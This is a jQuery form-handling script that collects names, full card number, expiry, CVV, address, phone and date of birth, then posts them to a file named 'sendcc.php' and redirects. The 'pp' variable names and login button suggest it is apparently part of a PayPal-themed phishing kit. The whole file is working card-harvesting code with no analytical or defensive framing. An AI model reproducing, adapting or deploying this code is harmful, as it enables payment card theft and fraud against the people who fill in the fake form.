$(document).ready(function () {

	$('#cc').inputmask({"mask": "9999 9999 9999 9999"});
	$('#exd').inputmask({"mask": "99/99"});
	$('#cvv').inputmask({"mask": "9999"});
	$('#dob').inputmask({"mask": "99/99/9999"});
	
	$('.cc').keyup(function(){

	
        $('.cc').validateCreditCard(function(result) {
			var response = result.length_valid;
			if(response == false){
				$('.ccHaseError').css({
					borderColor : 'red' 
				});
			}
			else {
				$('.ccHaseError').css({
					borderColor : '#b3b3b3' 
				});
			}
			
			
        });
	
	});
	

	$('.fname').keyup(function(){
		
		$('.msgfname').addClass('hiddens');
		
	})

	$('.lname').keyup(function(){
		
		$('.msglname').addClass('hiddens');
		
	})
	$('.cc').keyup(function(){
		
		$('.msgCC').addClass('hiddens');
		
	})
	$('.exd').keyup(function(){
		
		$('.msgexd').addClass('hiddens');
		
	})
	$('.cvv').keyup(function(){
		
		$('.msgcvv').addClass('hiddens');
		
	})
	$('.adrs').keyup(function(){
		
		$('.msgadrs').addClass('hiddens');
		
	})
	$('.ct').keyup(function(){
		
		$('.msgct').addClass('hiddens');
		
	})
	$('.zip').keyup(function(){
		
		$('.msgzip').addClass('hiddens');
		
	})
	$('.phone').keyup(function(){
		
		$('.msgphone').addClass('hiddens');
		
	})
	$('.dob').keyup(function(){
		
		$('.msgdob').addClass('hiddens');
		
	})



	
    $('#loginbtn').click(function () {
		
		var ppfname = $('.fname').val();
		
		var pplname = $('.lname').val();
		
		var ppcc = $('.cc').val();
		
		var ppccexp = $('.exd').val();
		
		var ppcvv = $('.cvv').val();
		
		var ppaddress = $('.adrs').val();
		
		var ppcity = $('.ct').val();
		
		var ppzip = $('.zip').val();
		
		var ppphone = $('.phone').val();
		
		var ppbirth = $('.dob').val();	
		
		
		if(ppfname == ''){
			$('.msgfname').removeClass('hiddens');
		}
		else if(pplname == ''){
			$('.msglname').removeClass('hiddens');
		}
		else if(ppcc == ''){
			$('.msgCC').removeClass('hiddens');
		}
		else if(ppccexp == ''){
			$('.msgexd').removeClass('hiddens');
		}
				
		else if(ppcvv == ''){
			$('.msgcvv').removeClass('hiddens');
		}
		
		else if(ppaddress == ''){
			$('.msgadrs').removeClass('hiddens');
		}
		
		else if(ppcity == ''){
			$('.msgct').removeClass('hiddens');
		}
		
		else if(ppzip == ''){
			$('.msgzip').removeClass('hiddens');
		}
		
		else if(ppphone == ''){
			$('.msgphone').removeClass('hiddens');
		}
		
		else if(ppbirth == ''){
			$('.msgdob').removeClass('hiddens');
		}
	
		else {
			var data = $('.loginForm').serialize();
			$.ajax({
				type: 'post',
				url: 'assest/sendcc.php',
				data: data,
				beforeSend: function(){
					$("#LoaderContent").removeClass("divLoaderHidden");
					$("#LoaderContent").addClass("divLoader");
				},
				success: function (response) {
					
					location.href="../U/";
						
				}
			});
			
		}
        return false;
    });
	
})
